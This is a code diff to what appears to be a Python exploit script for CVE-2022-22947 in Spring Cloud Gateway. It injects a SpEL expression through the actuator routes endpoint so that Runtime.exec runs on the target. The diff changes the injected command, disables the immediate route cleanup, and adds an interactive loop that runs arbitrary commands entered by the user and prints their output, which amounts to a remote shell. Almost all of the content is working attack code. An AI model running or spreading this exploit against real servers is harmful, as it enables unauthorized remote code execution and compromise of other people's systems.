@@ -102,7 +102,7 @@ def CVE_2022_22947(url, proxies):
               "id": "hacktest",\r
               "filters": [{\r
                 "name": "AddResponseHeader",\r
-                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
+                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id -a\\"}).getInputStream()))}"}\r
                 }],\r
               "uri": "http://example.com",\r
               "order": 0\r
@@ -112,12 +112,28 @@ def CVE_2022_22947(url, proxies):
     re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False, proxies=proxies)
     re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
     re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
-    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+    #re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
     re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
     if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
         cprint("[+] Payload已经输出，回显结果如下：", "red")
         print('\n')
         print(re3.text)
+        print('\n')
+        print("[+] 执行命令模块（输入exit退出）")
+        while 1:
+            Cmd = input("[+] 请输入要执行的命令>>> ")
+            if Cmd == "exit":
+                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
+                sys.exit(0)
+            else:
+                payloadnew = payload.replace('id -a', Cmd)
+                re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payloadnew, headers=headers1, json=json ,verify=False, proxies=proxies)
+                re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
+                re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+                result = re3.text
+                cprint(result ,"green")
+                print('\n')
     else:
         cprint("[-] CVE-2022-22947漏洞不存在", "yellow")
         print('\n')
